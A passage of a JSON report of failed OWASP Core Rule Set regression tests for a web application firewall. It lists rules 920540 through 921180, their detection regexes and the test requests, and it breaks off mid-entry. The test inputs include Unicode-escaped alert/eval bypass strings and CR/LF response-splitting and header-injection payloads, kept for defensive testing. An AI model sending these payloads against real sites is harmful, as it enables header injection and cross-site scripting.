{
  "global_stats" : {
    "failure_percentage" : 9.30119308497687,
    "passing_percentage" : 90.69880691502313,
    "total_tests" : 4107,
    "success_tests" : 3725,
    "failure_tests" : 382
  },
  "test_failures" : [ {
    "test_rule" : "920540",
    "test_id" : 1,
    "test_path" : "REQUEST-920-PROTOCOL-ENFORCEMENT/920540.yaml",
    "description" : "Unicode character bypass issue #2512: alert() \\u0061lert",
    "cause" : "failed expect_id check: 920540 not found",
    "result" : {
      "disposition" : {
        "type" : "Disposition",
        "action_type" : "continue"
      },
      "events" : [ "phase=2 rule_id=920273 - Invalid character in request (outside of very strict set)" ]
    },
    "test" : {
      "test_id" : 1,
      "desc" : "Unicode character bypass issue #2512: alert() \\u0061lert",
      "stages" : [ {
        "input" : {
          "dest_addr" : "127.0.0.1",
          "port" : 80,
          "method" : "POST",
          "headers" : {
            "User-Agent" : "OWASP CRS test agent",
            "Host" : "localhost",
            "Content-Type" : "application/x-www-form-urlencoded; charset=utf-8",
            "Accept" : "text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5"
          },
          "uri" : "/",
          "data" : "testarg=%5Cu0061lert",
          "version" : "HTTP/1.1"
        },
        "output" : {
          "log" : {
            "expect_ids" : [ 920540 ]
          }
        }
      } ]
    },
    "tested_rule" : {
      "type" : "SecRule",
      "id" : 920540,
      "phase" : 2,
      "chain" : true,
      "comment_block" : {
        "type" : "CommentBlock",
        "comments" : [ {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " Unicode character bypass check for non JSON requests"
        }, {
          "type" : "Comment",
          "text" : " See reported bypass in issue:"
        }, {
          "type" : "Comment",
          "text" : " https://github.com/coreruleset/coreruleset/issues/2512"
        }, {
          "type" : "Comment",
          "text" : ""
        } ]
      },
      "variables" : {
        "type" : "Variables",
        "negated" : true,
        "count" : false,
        "variables" : [ {
          "type" : "SimpleVariable",
          "name" : "REQBODY_PROCESSOR"
        } ],
        "negated_variables" : [ ]
      },
      "operator" : {
        "type" : "Operator",
        "operator_type" : "negated",
        "operator" : {
          "type" : "Operator",
          "operator_type" : "streq",
          "value" : "JSON"
        }
      },
      "actions" : {
        "type" : "Actions",
        "actions" : [ {
          "type" : "Action",
          "action_type" : "id",
          "value" : 920540
        }, {
          "type" : "Action",
          "action_type" : "phase",
          "value" : 2
        }, {
          "type" : "Action",
          "action_type" : "block"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "none"
        }, {
          "type" : "Action",
          "action_type" : "msg",
          "value" : "Possible Unicode character bypass detected"
        }, {
          "type" : "Action",
          "action_type" : "log_data",
          "value" : "%{MATCHED_VAR_NAME}=%{MATCHED_VAR}"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "application-multi"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "language-multi"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "platform-multi"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "attack-protocol"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "paranoia-level/1"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "OWASP_CRS"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "OWASP_CRS/PROTOCOL-ENFORCEMENT"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "capec/1000/255/153/267/72"
        }, {
          "type" : "Action",
          "action_type" : "ver",
          "value" : "OWASP_CRS/4.22.0-dev"
        }, {
          "type" : "Action",
          "action_type" : "severity",
          "value" : "Critical"
        }, {
          "type" : "Action",
          "action_type" : "chain"
        } ]
      }
    }
  }, {
    "test_rule" : "920540",
    "test_id" : 2,
    "test_path" : "REQUEST-920-PROTOCOL-ENFORCEMENT/920540.yaml",
    "description" : "Unicode character bypass issue #2512: eval() \\u0065val()",
    "cause" : "failed expect_id check: 920540 not found",
    "result" : {
      "disposition" : {
        "type" : "Disposition",
        "action_type" : "continue"
      },
      "events" : [ "phase=2 rule_id=920273 - Invalid character in request (outside of very strict set)" ]
    },
    "test" : {
      "test_id" : 2,
      "desc" : "Unicode character bypass issue #2512: eval() \\u0065val()",
      "stages" : [ {
        "input" : {
          "dest_addr" : "127.0.0.1",
          "port" : 80,
          "method" : "POST",
          "headers" : {
            "User-Agent" : "OWASP CRS test agent",
            "Host" : "localhost",
            "Content-Type" : "application/x-www-form-urlencoded; charset=utf-8",
            "Accept" : "text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5"
          },
          "uri" : "/",
          "data" : "testarg=%5Cu0065val%28%29",
          "version" : "HTTP/1.1"
        },
        "output" : {
          "log" : {
            "expect_ids" : [ 920540 ]
          }
        }
      } ]
    },
    "tested_rule" : {
      "type" : "SecRule",
      "id" : 920540,
      "phase" : 2,
      "chain" : true,
      "comment_block" : {
        "type" : "CommentBlock",
        "comments" : [ {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " Unicode character bypass check for non JSON requests"
        }, {
          "type" : "Comment",
          "text" : " See reported bypass in issue:"
        }, {
          "type" : "Comment",
          "text" : " https://github.com/coreruleset/coreruleset/issues/2512"
        }, {
          "type" : "Comment",
          "text" : ""
        } ]
      },
      "variables" : {
        "type" : "Variables",
        "negated" : true,
        "count" : false,
        "variables" : [ {
          "type" : "SimpleVariable",
          "name" : "REQBODY_PROCESSOR"
        } ],
        "negated_variables" : [ ]
      },
      "operator" : {
        "type" : "Operator",
        "operator_type" : "negated",
        "operator" : {
          "type" : "Operator",
          "operator_type" : "streq",
          "value" : "JSON"
        }
      },
      "actions" : {
        "type" : "Actions",
        "actions" : [ {
          "type" : "Action",
          "action_type" : "id",
          "value" : 920540
        }, {
          "type" : "Action",
          "action_type" : "phase",
          "value" : 2
        }, {
          "type" : "Action",
          "action_type" : "block"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "none"
        }, {
          "type" : "Action",
          "action_type" : "msg",
          "value" : "Possible Unicode character bypass detected"
        }, {
          "type" : "Action",
          "action_type" : "log_data",
          "value" : "%{MATCHED_VAR_NAME}=%{MATCHED_VAR}"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "application-multi"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "language-multi"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "platform-multi"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "attack-protocol"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "paranoia-level/1"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "OWASP_CRS"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "OWASP_CRS/PROTOCOL-ENFORCEMENT"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "capec/1000/255/153/267/72"
        }, {
          "type" : "Action",
          "action_type" : "ver",
          "value" : "OWASP_CRS/4.22.0-dev"
        }, {
          "type" : "Action",
          "action_type" : "severity",
          "value" : "Critical"
        }, {
          "type" : "Action",
          "action_type" : "chain"
        } ]
      }
    }
  }, {
    "test_rule" : "921120",
    "test_id" : 1,
    "test_path" : "REQUEST-921-PROTOCOL-ATTACK/921120.yaml",
    "description" : "HTTP response splitting (921120) from old modsec regressions",
    "cause" : "failed expect_id check: 921120 not found",
    "result" : {
      "disposition" : {
        "type" : "Disposition",
        "action_type" : "continue"
      },
      "events" : [ "phase=2 rule_id=920272 - Invalid character in request (outside of printable chars below ascii 127)" ]
    },
    "test" : {
      "test_id" : 1,
      "desc" : "HTTP response splitting (921120) from old modsec regressions",
      "stages" : [ {
        "input" : {
          "dest_addr" : "127.0.0.1",
          "headers" : {
            "Accept" : "text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5",
            "Accept-Encoding" : "gzip, deflate",
            "Accept-Language" : "zh-sg",
            "Host" : "localhost",
            "Keep-Alive" : "300",
            "Proxy-Connection" : "keep-alive",
            "Referer" : "http",
            "User-Agent" : "OWASP CRS test agent"
          },
          "method" : "GET",
          "port" : 80,
          "uri" : "/?lang=foobar%0d%0aContent-Length:%200%0d%0a%0d%0aHTTP/1.1%20200%20OK%0d%0aContent-Type:%20text/html%0d%0aContent-Length:%2019%0d%0a%0d%0a<html>Shazam</html>",
          "version" : "HTTP/1.1"
        },
        "output" : {
          "log" : {
            "expect_ids" : [ 921120 ]
          }
        }
      } ]
    },
    "tested_rule" : {
      "type" : "SecRule",
      "id" : 921120,
      "phase" : 2,
      "chain" : false,
      "comment_block" : {
        "type" : "CommentBlock",
        "comments" : [ {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " -=[ HTTP Response Splitting ]=-"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " [ Rule Logic ]"
        }, {
          "type" : "Comment",
          "text" : " These rules look for Carriage Return (CR) %0d and Linefeed (LF) %0a characters."
        }, {
          "type" : "Comment",
          "text" : " These characters may cause problems if the data is returned in a response header and"
        }, {
          "type" : "Comment",
          "text" : " may be interpreted by an intermediary proxy server and treated as two separate"
        }, {
          "type" : "Comment",
          "text" : " responses."
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " [ References ]"
        }, {
          "type" : "Comment",
          "text" : " http://projects.webappsec.org/HTTP-Response-Splitting"
        }, {
          "type" : "Comment",
          "text" : ""
        } ]
      },
      "variables" : {
        "type" : "Variables",
        "negated" : true,
        "count" : false,
        "variables" : [ {
          "type" : "CollectionVariable",
          "collection" : "REQUEST_COOKIES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "REQUEST_COOKIES_NAMES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "ARGS_NAMES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "ARGS",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "XML",
          "key" : "/*"
        } ],
        "negated_variables" : [ ]
      },
      "operator" : {
        "type" : "Operator",
        "operator_type" : "rx",
        "pattern" : "[\\r\\n]\\W*?(?:content-(?:type|length)|set-cookie|location):\\s*\\w"
      },
      "actions" : {
        "type" : "Actions",
        "actions" : [ {
          "type" : "Action",
          "action_type" : "id",
          "value" : 921120
        }, {
          "type" : "Action",
          "action_type" : "phase",
          "value" : 2
        }, {
          "type" : "Action",
          "action_type" : "block"
        }, {
          "type" : "Action",
          "action_type" : "capture"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "none"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "lowercase"
        }, {
          "type" : "Action",
          "action_type" : "msg",
          "value" : "HTTP Response Splitting Attack"
        }, {
          "type" : "Action",
          "action_type" : "log_data",
          "value" : "Matched Data: %{TX.0} found within %{MATCHED_VAR_NAME}: %{MATCHED_VAR}"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "application-multi"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "language-multi"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "platform-multi"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "attack-protocol"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "paranoia-level/1"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "OWASP_CRS"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "OWASP_CRS/PROTOCOL-ATTACK"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "capec/1000/210/272/220/34"
        }, {
          "type" : "Action",
          "action_type" : "ver",
          "value" : "OWASP_CRS/4.22.0-dev"
        }, {
          "type" : "Action",
          "action_type" : "severity",
          "value" : "Critical"
        }, {
          "type" : "Action",
          "action_type" : "set_var",
          "expr" : "tx.http_violation_score=+%{tx.critical_anomaly_score}"
        }, {
          "type" : "Action",
          "action_type" : "set_var",
          "expr" : "tx.inbound_anomaly_score_pl1=+%{tx.critical_anomaly_score}"
        } ]
      }
    }
  }, {
    "test_rule" : "921120",
    "test_id" : 2,
    "test_path" : "REQUEST-921-PROTOCOL-ATTACK/921120.yaml",
    "description" : "HTTP Response splitting attack",
    "cause" : "failed expect_id check: 921120 not found",
    "result" : {
      "disposition" : {
        "type" : "Disposition",
        "action_type" : "continue"
      },
      "events" : [ "phase=2 rule_id=920272 - Invalid character in request (outside of printable chars below ascii 127)" ]
    },
    "test" : {
      "test_id" : 2,
      "desc" : "HTTP Response splitting attack",
      "stages" : [ {
        "input" : {
          "dest_addr" : "127.0.0.1",
          "headers" : {
            "Host" : "localhost",
            "Proxy-Connection" : "keep-alive",
            "Referer" : "http",
            "User-Agent" : "OWASP CRS test agent",
            "Accept" : "text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5"
          },
          "method" : "GET",
          "port" : 80,
          "uri" : "/file.jsp?somevar=foobar%0d%0aContent-Length:%2002343432423<html>ftw</html>",
          "version" : "HTTP/1.1"
        },
        "output" : {
          "log" : {
            "expect_ids" : [ 921120 ]
          }
        }
      } ]
    },
    "tested_rule" : {
      "type" : "SecRule",
      "id" : 921120,
      "phase" : 2,
      "chain" : false,
      "comment_block" : {
        "type" : "CommentBlock",
        "comments" : [ {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " -=[ HTTP Response Splitting ]=-"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " [ Rule Logic ]"
        }, {
          "type" : "Comment",
          "text" : " These rules look for Carriage Return (CR) %0d and Linefeed (LF) %0a characters."
        }, {
          "type" : "Comment",
          "text" : " These characters may cause problems if the data is returned in a response header and"
        }, {
          "type" : "Comment",
          "text" : " may be interpreted by an intermediary proxy server and treated as two separate"
        }, {
          "type" : "Comment",
          "text" : " responses."
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " [ References ]"
        }, {
          "type" : "Comment",
          "text" : " http://projects.webappsec.org/HTTP-Response-Splitting"
        }, {
          "type" : "Comment",
          "text" : ""
        } ]
      },
      "variables" : {
        "type" : "Variables",
        "negated" : true,
        "count" : false,
        "variables" : [ {
          "type" : "CollectionVariable",
          "collection" : "REQUEST_COOKIES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "REQUEST_COOKIES_NAMES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "ARGS_NAMES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "ARGS",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "XML",
          "key" : "/*"
        } ],
        "negated_variables" : [ ]
      },
      "operator" : {
        "type" : "Operator",
        "operator_type" : "rx",
        "pattern" : "[\\r\\n]\\W*?(?:content-(?:type|length)|set-cookie|location):\\s*\\w"
      },
      "actions" : {
        "type" : "Actions",
        "actions" : [ {
          "type" : "Action",
          "action_type" : "id",
          "value" : 921120
        }, {
          "type" : "Action",
          "action_type" : "phase",
          "value" : 2
        }, {
          "type" : "Action",
          "action_type" : "block"
        }, {
          "type" : "Action",
          "action_type" : "capture"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "none"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "lowercase"
        }, {
          "type" : "Action",
          "action_type" : "msg",
          "value" : "HTTP Response Splitting Attack"
        }, {
          "type" : "Action",
          "action_type" : "log_data",
          "value" : "Matched Data: %{TX.0} found within %{MATCHED_VAR_NAME}: %{MATCHED_VAR}"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "application-multi"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "language-multi"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "platform-multi"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "attack-protocol"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "paranoia-level/1"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "OWASP_CRS"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "OWASP_CRS/PROTOCOL-ATTACK"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "capec/1000/210/272/220/34"
        }, {
          "type" : "Action",
          "action_type" : "ver",
          "value" : "OWASP_CRS/4.22.0-dev"
        }, {
          "type" : "Action",
          "action_type" : "severity",
          "value" : "Critical"
        }, {
          "type" : "Action",
          "action_type" : "set_var",
          "expr" : "tx.http_violation_score=+%{tx.critical_anomaly_score}"
        }, {
          "type" : "Action",
          "action_type" : "set_var",
          "expr" : "tx.inbound_anomaly_score_pl1=+%{tx.critical_anomaly_score}"
        } ]
      }
    }
  }, {
    "test_rule" : "921140",
    "test_id" : 1,
    "test_path" : "REQUEST-921-PROTOCOL-ATTACK/921140.yaml",
    "description" : "HTTP Header Injection Attack via headers",
    "cause" : "failed no_expect_ids check: 921140 was found",
    "result" : {
      "disposition" : {
        "type" : "Disposition",
        "action_type" : "continue"
      },
      "events" : [ "phase=1 rule_id=920274 - Invalid character in request headers (outside of very strict set)", "phase=1 rule_id=921140 - HTTP Header Injection Attack via headers", "phase=2 rule_id=920272 - Invalid character in request (outside of printable chars below ascii 127)" ]
    },
    "test" : {
      "test_id" : 1,
      "desc" : "HTTP Header Injection Attack via headers",
      "stages" : [ {
        "input" : {
          "dest_addr" : "127.0.0.1",
          "method" : "GET",
          "port" : 80,
          "headers" : {
            "Host" : "localhost",
            "SomeHeader" : "Headerdata\rInjectedHeader: response_splitting_code",
            "User-Agent" : "OWASP CRS test agent",
            "Accept" : "text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5"
          },
          "uri" : "/",
          "version" : "HTTP/1.1"
        },
        "output" : {
          "status" : 400,
          "log" : {
            "no_expect_ids" : [ 921140 ]
          }
        }
      } ]
    },
    "tested_rule" : {
      "type" : "SecRule",
      "id" : 921140,
      "phase" : 1,
      "chain" : false,
      "comment_block" : {
        "type" : "CommentBlock",
        "comments" : [ {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " -=[ HTTP Header Injection ]=-"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " [ Rule Logic ]"
        }, {
          "type" : "Comment",
          "text" : " These rules look for Carriage Return (CR) %0d and Linefeed (LF) %0a characters,"
        }, {
          "type" : "Comment",
          "text" : " on their own or in combination with header field names."
        }, {
          "type" : "Comment",
          "text" : " These characters may cause problems if the data is returned in a response header"
        }, {
          "type" : "Comment",
          "text" : " and interpreted by the client."
        }, {
          "type" : "Comment",
          "text" : " The rules are similar to rules defending against the HTTP Request Splitting and"
        }, {
          "type" : "Comment",
          "text" : " Request Smuggling rules."
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " [ References ]"
        }, {
          "type" : "Comment",
          "text" : " https://en.wikipedia.org/wiki/HTTP_header_injection"
        }, {
          "type" : "Comment",
          "text" : ""
        } ]
      },
      "variables" : {
        "type" : "Variables",
        "negated" : true,
        "count" : false,
        "variables" : [ {
          "type" : "CollectionVariable",
          "collection" : "REQUEST_HEADERS_NAMES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "REQUEST_HEADERS",
          "key" : null
        } ],
        "negated_variables" : [ ]
      },
      "operator" : {
        "type" : "Operator",
        "operator_type" : "rx",
        "pattern" : "[\\n\\r]"
      },
      "actions" : {
        "type" : "Actions",
        "actions" : [ {
          "type" : "Action",
          "action_type" : "id",
          "value" : 921140
        }, {
          "type" : "Action",
          "action_type" : "phase",
          "value" : 1
        }, {
          "type" : "Action",
          "action_type" : "block"
        }, {
          "type" : "Action",
          "action_type" : "capture"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "none"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "urlDecodeUni"
        }, {
          "type" : "Action",
          "action_type" : "msg",
          "value" : "HTTP Header Injection Attack via headers"
        }, {
          "type" : "Action",
          "action_type" : "log_data",
          "value" : "Matched Data: %{TX.0} found within %{MATCHED_VAR_NAME}: %{MATCHED_VAR}"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "application-multi"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "language-multi"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "platform-multi"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "attack-protocol"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "paranoia-level/1"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "OWASP_CRS"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "OWASP_CRS/PROTOCOL-ATTACK"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "capec/1000/210/272/220/273"
        }, {
          "type" : "Action",
          "action_type" : "ver",
          "value" : "OWASP_CRS/4.22.0-dev"
        }, {
          "type" : "Action",
          "action_type" : "severity",
          "value" : "Critical"
        }, {
          "type" : "Action",
          "action_type" : "set_var",
          "expr" : "tx.http_violation_score=+%{tx.critical_anomaly_score}"
        }, {
          "type" : "Action",
          "action_type" : "set_var",
          "expr" : "tx.inbound_anomaly_score_pl1=+%{tx.critical_anomaly_score}"
        } ]
      }
    }
  }, {
    "test_rule" : "921150",
    "test_id" : 1,
    "test_path" : "REQUEST-921-PROTOCOL-ATTACK/921150.yaml",
    "description" : "HTTP Header Injection Attack via payload",
    "cause" : "failed expect_id check: 921150 not found",
    "result" : {
      "disposition" : {
        "type" : "Disposition",
        "action_type" : "continue"
      },
      "events" : [ "phase=2 rule_id=920272 - Invalid character in request (outside of printable chars below ascii 127)" ]
    },
    "test" : {
      "test_id" : 1,
      "desc" : "HTTP Header Injection Attack via payload",
      "stages" : [ {
        "input" : {
          "dest_addr" : "127.0.0.1",
          "method" : "GET",
          "port" : 80,
          "headers" : {
            "Host" : "localhost",
            "User-Agent" : "OWASP CRS test agent",
            "Accept" : "text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5"
          },
          "uri" : "/get/script.jsp?variableX=bar&variable2=Y&%0d%0restofdata",
          "version" : "HTTP/1.1"
        },
        "output" : {
          "log" : {
            "expect_ids" : [ 921150 ]
          }
        }
      } ]
    },
    "tested_rule" : {
      "type" : "SecRule",
      "id" : 921150,
      "phase" : 2,
      "chain" : false,
      "comment_block" : {
        "type" : "CommentBlock",
        "comments" : [ {
          "type" : "Comment",
          "text" : " Detect newlines in argument names."
        }, {
          "type" : "Comment",
          "text" : " Checking for GET arguments has been moved to paranoia level 2 (921151)"
        }, {
          "type" : "Comment",
          "text" : " in order to mitigate possible false positives."
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " This rule is also triggered by the following exploit(s):"
        }, {
          "type" : "Comment",
          "text" : " [ SAP CRM Java vulnerability CVE-2018-2380 - Exploit tested: https://www.exploit-db.com/exploits/44292 ]"
        }, {
          "type" : "Comment",
          "text" : ""
        } ]
      },
      "variables" : {
        "type" : "Variables",
        "negated" : true,
        "count" : false,
        "variables" : [ {
          "type" : "CollectionVariable",
          "collection" : "ARGS_NAMES",
          "key" : null
        } ],
        "negated_variables" : [ ]
      },
      "operator" : {
        "type" : "Operator",
        "operator_type" : "rx",
        "pattern" : "[\\n\\r]"
      },
      "actions" : {
        "type" : "Actions",
        "actions" : [ {
          "type" : "Action",
          "action_type" : "id",
          "value" : 921150
        }, {
          "type" : "Action",
          "action_type" : "phase",
          "value" : 2
        }, {
          "type" : "Action",
          "action_type" : "block"
        }, {
          "type" : "Action",
          "action_type" : "capture"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "none"
        }, {
          "type" : "Action",
          "action_type" : "msg",
          "value" : "HTTP Header Injection Attack via payload (CR/LF detected)"
        }, {
          "type" : "Action",
          "action_type" : "log_data",
          "value" : "Matched Data: %{TX.0} found within %{MATCHED_VAR_NAME}: %{MATCHED_VAR}"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "application-multi"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "language-multi"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "platform-multi"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "attack-protocol"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "paranoia-level/1"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "OWASP_CRS"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "OWASP_CRS/PROTOCOL-ATTACK"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "capec/1000/210/272/220/33"
        }, {
          "type" : "Action",
          "action_type" : "ver",
          "value" : "OWASP_CRS/4.22.0-dev"
        }, {
          "type" : "Action",
          "action_type" : "severity",
          "value" : "Critical"
        }, {
          "type" : "Action",
          "action_type" : "set_var",
          "expr" : "tx.http_violation_score=+%{tx.critical_anomaly_score}"
        }, {
          "type" : "Action",
          "action_type" : "set_var",
          "expr" : "tx.inbound_anomaly_score_pl1=+%{tx.critical_anomaly_score}"
        } ]
      }
    }
  }, {
    "test_rule" : "921160",
    "test_id" : 1,
    "test_path" : "REQUEST-921-PROTOCOL-ATTACK/921160.yaml",
    "description" : "HTTP Header Injection Attack via payload: w/header, invalid line break, newlines after key",
    "cause" : "failed expect_id check: 921160 not found",
    "result" : {
      "disposition" : {
        "type" : "Disposition",
        "action_type" : "continue"
      },
      "events" : [ "phase=2 rule_id=920272 - Invalid character in request (outside of printable chars below ascii 127)" ]
    },
    "test" : {
      "test_id" : 1,
      "desc" : "HTTP Header Injection Attack via payload: w/header, invalid line break, newlines after key",
      "stages" : [ {
        "input" : {
          "dest_addr" : "127.0.0.1",
          "method" : "GET",
          "port" : 80,
          "headers" : {
            "Host" : "localhost",
            "User-Agent" : "OWASP CRS test agent",
            "Accept" : "text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5"
          },
          "uri" : "/script_rule921160.jsp?variableX=bar&variable2=Y&%0d%0Remote-addr%0d%0d%0d:%20foo.bar.com",
          "version" : "HTTP/1.1"
        },
        "output" : {
          "log" : {
            "expect_ids" : [ 921160 ]
          }
        }
      } ]
    },
    "tested_rule" : {
      "type" : "SecRule",
      "id" : 921160,
      "phase" : 1,
      "chain" : false,
      "comment_block" : null,
      "variables" : {
        "type" : "Variables",
        "negated" : true,
        "count" : false,
        "variables" : [ {
          "type" : "CollectionVariable",
          "collection" : "ARGS_GET_NAMES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "ARGS_GET",
          "key" : null
        } ],
        "negated_variables" : [ ]
      },
      "operator" : {
        "type" : "Operator",
        "operator_type" : "rx",
        "pattern" : "[\\n\\r]+(?:\\s|location|refresh|(?:set-)?cookie|(?:x-)?(?:forwarded-(?:for|host|server)|host|via|remote-ip|remote-addr|originating-IP))\\s*:"
      },
      "actions" : {
        "type" : "Actions",
        "actions" : [ {
          "type" : "Action",
          "action_type" : "id",
          "value" : 921160
        }, {
          "type" : "Action",
          "action_type" : "phase",
          "value" : 1
        }, {
          "type" : "Action",
          "action_type" : "block"
        }, {
          "type" : "Action",
          "action_type" : "capture"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "none"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "lowercase"
        }, {
          "type" : "Action",
          "action_type" : "msg",
          "value" : "HTTP Header Injection Attack via payload (CR/LF and header-name detected)"
        }, {
          "type" : "Action",
          "action_type" : "log_data",
          "value" : "Matched Data: %{TX.0} found within %{MATCHED_VAR_NAME}: %{MATCHED_VAR}"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "application-multi"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "language-multi"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "platform-multi"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "attack-protocol"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "paranoia-level/1"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "OWASP_CRS"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "OWASP_CRS/PROTOCOL-ATTACK"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "capec/1000/210/272/220/33"
        }, {
          "type" : "Action",
          "action_type" : "ver",
          "value" : "OWASP_CRS/4.22.0-dev"
        }, {
          "type" : "Action",
          "action_type" : "severity",
          "value" : "Critical"
        }, {
          "type" : "Action",
          "action_type" : "set_var",
          "expr" : "tx.http_violation_score=+%{tx.critical_anomaly_score}"
        }, {
          "type" : "Action",
          "action_type" : "set_var",
          "expr" : "tx.inbound_anomaly_score_pl1=+%{tx.critical_anomaly_score}"
        } ]
      }
    }
  }, {
    "test_rule" : "921180",
    "test_id" : 4,
    "test_path" : "REQUEST-921-PROTOCOL-ATTACK/921180.yaml",
    "description" : "--",
    "cause" : "failed expect_id check: 921180 not found",
    "result" : {
      "disposition" : {
        "type" : "Disposition",
        "action_type" : "continue"
      },
      "events" : [ ]
    },
    "test" : {
      "test_id" : 4,
      "stages" : [ {
        "input" : {
          "dest_addr" : "127.0.0.1",
          "method" : "GET",
          "port" : 80,
          "headers" : {
            "User-Agent" : "OWASP CRS test agent",
            "Host" : "localhost",
            "Accept" : "text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5"
          },
